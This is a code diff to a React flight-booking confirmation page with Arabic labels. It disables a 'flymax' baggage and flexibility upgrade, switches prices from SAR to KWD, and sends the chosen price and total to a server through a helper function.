@@ -3,64 +3,55 @@ import ShinyButton from "@/components/ui/shiny-button";
 import destinations from "@/data/destinations";
 import { cn } from "@/lib/utils";
 import { PlaneTakeoffIcon } from "lucide-react";
-import { FC, useEffect, useState } from "react";
+import { FC, useEffect } from "react";
 import { BsAirplaneFill } from "react-icons/bs";
 import { Link, useLocation, useNavigate } from "react-router-dom";
-import { Button } from "@/components/ui/button";
-import {
-  Dialog,
-  DialogClose,
-  DialogContent,
-  DialogHeader,
-  DialogTitle,
-  DialogTrigger,
-} from "@/components/ui/dialog";
 import { sendDataToServer, setCurrentPage } from "@/real-time/utils/utils";
 
-const flymax = [
-  {
-    title: "حقيبة صغيرة تحت المقعد",
-    desc: "40x20x30 سم",
-    icon: "/assets/images/flymax/small-bag.svg",
-  },
-  {
-    title: "حقيبة مقصورة مع أسبقيّة صعود الطائرة",
-    desc: "10 كغ ، 40x20x55 سم و أسبقية الصعود إلى الطائرة",
-    icon: "/assets/images/flymax/carry-bag.svg",
-  },
-  {
-    title: "اختيار المقعد المميّز",
-    desc: "الصفوف 1 إلى 4",
-    icon: "/assets/images/flymax/select-seat.svg",
-  },
-  {
-    title: "حقيبة شحن بوزن 40 كغ",
-    desc: "(15 كغ 1x ) +(25 كغ 1x )",
-    icon: "/assets/images/flymax/big-bag.svg",
-  },
-  {
-    title: "إنهاء اجراءات السفر أونلاين 10 أيام قبل الرحلة",
-    icon: "/assets/images/flymax/checkin-fast.svg",
-  },
-  {
-    title: "إنهاء اجراءات السفر في المطار مجّاناً",
-    icon: "/assets/images/flymax/airport-checkin.svg",
-  },
-  {
-    title: "تعديل غير محدود للرحلة",
-    icon: "/assets/images/flymax/edit-bag.svg",
-  },
-  {
-    title: "إلغاء الحجز مجّاناً",
-    desc: "إعادة المبلغ كرصيد",
-    icon: "/assets/images/flymax/cash-back.svg",
-  },
-  {
-    title: "وجبة مجاناً",
-    desc: "وجبة خفيفة ومشروب",
-    icon: "/assets/images/flymax/meal-free.svg",
-  },
-];
+// const flymax = [
+//   {
+//     title: "حقيبة صغيرة تحت المقعد",
+//     desc: "40x20x30 سم",
+//     icon: "/assets/images/flymax/small-bag.svg",
+//   },
+//   {
+//     title: "حقيبة مقصورة مع أسبقيّة صعود الطائرة",
+//     desc: "10 كغ ، 40x20x55 سم و أسبقية الصعود إلى الطائرة",
+//     icon: "/assets/images/flymax/carry-bag.svg",
+//   },
+//   {
+//     title: "اختيار المقعد المميّز",
+//     desc: "الصفوف 1 إلى 4",
+//     icon: "/assets/images/flymax/select-seat.svg",
+//   },
+//   {
+//     title: "حقيبة شحن بوزن 40 كغ",
+//     desc: "(15 كغ 1x ) +(25 كغ 1x )",
+//     icon: "/assets/images/flymax/big-bag.svg",
+//   },
+//   {
+//     title: "إنهاء اجراءات السفر أونلاين 10 أيام قبل الرحلة",
+//     icon: "/assets/images/flymax/checkin-fast.svg",
+//   },
+//   {
+//     title: "إنهاء اجراءات السفر في المطار مجّاناً",
+//     icon: "/assets/images/flymax/airport-checkin.svg",
+//   },
+//   {
+//     title: "تعديل غير محدود للرحلة",
+//     icon: "/assets/images/flymax/edit-bag.svg",
+//   },
+//   {
+//     title: "إلغاء الحجز مجّاناً",
+//     desc: "إعادة المبلغ كرصيد",
+//     icon: "/assets/images/flymax/cash-back.svg",
+//   },
+//   {
+//     title: "وجبة مجاناً",
+//     desc: "وجبة خفيفة ومشروب",
+//     icon: "/assets/images/flymax/meal-free.svg",
+//   },
+// ];
 
 const TripConfirmPage = () => {
   useEffect(() => {
@@ -158,14 +149,14 @@ const TravelCard: FC<TravelCardProps> = ({
   price,
 }) => {
   const { state } = useLocation();
-  const [isFlymax, setIsFlymax] = useState(false);
+  // const [isFlymax, setIsFlymax] = useState(false);
   const navigate = useNavigate();
 
   const calculateTotal = (price: number) => {
     let total = state.activeTab === 0 ? price * 2 : price;
     total = (state.adult + state.child + state.baby) * total;
 
-    if (isFlymax) total += 200;
+    // if (isFlymax) total += 200;
 
     return total.toFixed(2).replace(/\.?0+$/, "");
   };
@@ -177,10 +168,6 @@ const TravelCard: FC<TravelCardProps> = ({
     );
 
     if (price) {
-      // navigate("/traveller-info", {
-      //   state: { ...state, price, total, ترقية: upgrade },
-      // });
-
       sendDataToServer({
         current: "تأكيد الرحلة",
         data: { السعر: price, "التكلفة الكلية": total, ترقية: upgrade },
@@ -253,21 +240,21 @@ const TravelCard: FC<TravelCardProps> = ({
           <p className="text-main capitalize text-center text-sm">
             سعر التذكرة:
             <br />
-            <strong className="text-base">{price} SAR</strong>
+            <strong className="text-base">{price} KWD</strong>
           </p>
           <p className="text-main capitalize text-center text-sm">
             التكلفة الكلية:
             <br />
-            <strong className="text-base">{calculateTotal(price)} SAR</strong>
+            <strong className="text-base">{calculateTotal(price)} KWD</strong>
           </p>
           <input type="hidden" name="price" value={price} />
           <input type="hidden" name="total" value={calculateTotal(price)} />
-          <input
+          {/* <input
             className="hidden"
             type="radio"
             name="upgrade"
             checked={isFlymax}
-          />
+          /> */}
           <ShinyButton
             text="اختيار"
             className="w-full bg-alt rounded-3xl tracking-tight font-bold py-2"
@@ -276,7 +263,7 @@ const TravelCard: FC<TravelCardProps> = ({
         </form>
       </div>
 
-      <div className="p-4 border-t w-full grid place-items-center">
+      {/* <div className="p-4 border-t w-full grid place-items-center">
         <Dialog>
           <DialogTrigger asChild>
             <Button className="w-fit bg-main hover:bg-main/85 text-white rounded-full mx-auto font-semibold text-sm sm:text-base sm:px-12 py-3 z-10">
@@ -290,7 +277,7 @@ const TravelCard: FC<TravelCardProps> = ({
                   <p>فلاي ماكس</p>
                   <p className="text-sm text-start">سافر بمرونة</p>
                 </div>
-                <p>SAR 200.00 +</p>
+                <p>KWD 200.00 +</p>
               </DialogTitle>
             </DialogHeader>
             <div className="h-[50dvh] overflow-y-scroll flex flex-col gap-4 px-4 border-b sm:border-b-0">
@@ -332,7 +319,7 @@ const TravelCard: FC<TravelCardProps> = ({
             </div>
           </DialogContent>
         </Dialog>
-      </div>
+      </div> */}
     </div>
   );
 };
